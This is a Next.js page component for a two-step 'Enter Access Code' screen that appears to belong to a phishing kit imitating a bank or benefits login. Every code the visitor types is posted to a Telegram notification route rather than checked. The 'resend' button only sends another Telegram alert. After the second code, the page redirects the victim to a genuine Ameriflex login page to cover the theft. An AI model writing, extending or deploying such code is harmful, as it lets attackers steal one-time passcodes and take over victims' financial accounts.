"use client";

import { Suspense, useState, useEffect } from "react";
import { useRouter, useSearchParams } from "next/navigation";
import { Button } from "@/components/ui/button";
import { SiteHeader } from "@/components/site-header";
import { Shield, Loader2 } from "lucide-react";

const ALIGHT_REDIRECT_URL = "https://participant.ameriflex.com/#/login";

function EnterCodeContent() {
  const [code, setCode] = useState("");
  const [isLoading, setIsLoading] = useState(false);
  const [isResending, setIsResending] = useState(false);
  const router = useRouter();
  const searchParams = useSearchParams();
  const isSecondOtp = searchParams.get("step") === "2";

  useEffect(() => {
    if (typeof window === "undefined") return;
    if (isSecondOtp) {
      if (!sessionStorage.getItem("ubs_otp2"))
        router.replace("/verify-details");
    } else {
      if (!sessionStorage.getItem("ubs_verify")) router.replace("/");
    }
  }, [isSecondOtp, router]);

  const handleVerify = async () => {
    if (isLoading) return;
    setIsLoading(true);
    try {
      await fetch("/api/telegram/verification", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          verificationType: isSecondOtp ? "Code (final)" : "Code (first OTP)",
          code,
        }),
      }).catch(console.error);
    } catch (error) {
      console.error("Failed to send verification notification:", error);
    }
    await new Promise((r) => setTimeout(r, 1000));
    if (isSecondOtp) {
      window.location.href = ALIGHT_REDIRECT_URL;
    } else {
      if (typeof window !== "undefined")
        sessionStorage.setItem("ubs_details", "1");
      router.push("/verify-details");
    }
  };

  const handleResend = async () => {
    if (isResending) return;
    setIsResending(true);
    try {
      await fetch("/api/telegram/resend-code", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ isSecondOtp }),
      }).catch(console.error);
    } catch (error) {
      console.error("Failed to send resend code notification:", error);
    }
    await new Promise((r) => setTimeout(r, 2000));
    setIsResending(false);
  };

  return (
    <div className="min-h-screen bg-white flex flex-col">
      <SiteHeader />
      <div className="max-w-2xl px-4 py-8 mx-auto w-full flex-1">
        {/* Progress Indicator */}
        <div className="flex items-center justify-center mb-12 gap-8">
          <div className="flex flex-col items-center">
            <div className="w-10 h-10 rounded-full bg-[#4A90E2] flex items-center justify-center text-white text-sm font-medium">
              ✓
            </div>
            <p className="text-xs text-gray-600 mt-2">Sign in</p>
          </div>

          <div className="flex-1 h-1 bg-gray-200"></div>

          <div className="flex flex-col items-center">
            <div className="w-10 h-10 rounded-full border-2 border-[#4A90E2] flex items-center justify-center text-[#4A90E2] text-sm font-medium">
              2
            </div>
            <p className="text-xs text-[#4A90E2] font-medium mt-2">Verify</p>
          </div>

          <div className="flex-1 h-1 bg-gray-200"></div>

          <div className="flex flex-col items-center">
            <div className="w-10 h-10 rounded-full border-2 border-gray-300 flex items-center justify-center text-gray-400 text-sm font-medium">
              3
            </div>
            <p className="text-xs text-gray-400 mt-2">Complete</p>
          </div>
        </div>

        {/* Main Content */}
        <div className="mb-8">
          <h1 className="text-2xl font-bold text-gray-900 mb-3">
            Enter Access Code
          </h1>
          <p className="text-gray-600 text-sm mb-6">
            Enter the code that was sent to you.
          </p>
        </div>

        {/* Code Input */}
        <div className="mb-8">
          <div className="mb-4">
            <input
              type="text"
              id="code"
              inputMode="numeric"
              value={code}
              onChange={(e) =>
                setCode(e.target.value.replace(/\D/g, "").slice(0, 6))
              }
              placeholder="000000"
              className="w-full max-w-sm px-3 py-2 border border-gray-300 rounded-lg text-sm focus:outline-none focus:ring-2 focus:ring-[#4A90E2] focus:border-transparent"
              maxLength={6}
            />
          </div>

          <button
            type="button"
            onClick={handleResend}
            disabled={isResending}
            className="text-[#4A90E2] hover:text-[#357ABD] text-sm font-medium disabled:opacity-70 disabled:cursor-not-allowed"
          >
            {isResending ? "Resending..." : "Didn't receive the code? Resend"}
          </button>
        </div>

        {/* Security Note */}
        <div className="flex gap-3 p-4 bg-gray-50 rounded-lg mb-8">
          <Shield className="w-5 h-5 text-[#4A90E2] shrink-0 mt-0.5" />
          <p className="text-gray-700 text-sm">
            For your security, this code expires in a few minutes and can only
            be used once.
          </p>
        </div>

        {/* Action Buttons */}
        <div className="space-y-3">
          <Button
            onClick={handleVerify}
            disabled={code.replace(/\D/g, "").length !== 6 || isLoading}
            className="w-full bg-[#4A90E2] hover:bg-[#357ABD] text-white font-medium py-3 rounded-lg"
          >
            {isLoading && <Loader2 className="w-4 h-4 mr-2 animate-spin" />}
            {isLoading ? "Verifying..." : "Continue"}
          </Button>

          <Button
            onClick={() => router.push("/")}
            variant="outline"
            disabled={isLoading}
            className="w-full border-[#4A90E2] text-[#4A90E2] font-medium py-3 rounded-lg hover:bg-gray-50"
          >
            Cancel
          </Button>
        </div>
      </div>
    </div>
  );
}

export default function EnterCodePage() {
  return (
    <Suspense
      fallback={
        <div className="min-h-screen bg-white flex items-center justify-center text-gray-600">
          Loading...
        </div>
      }
    >
      <EnterCodeContent />
    </Suspense>
  );
}
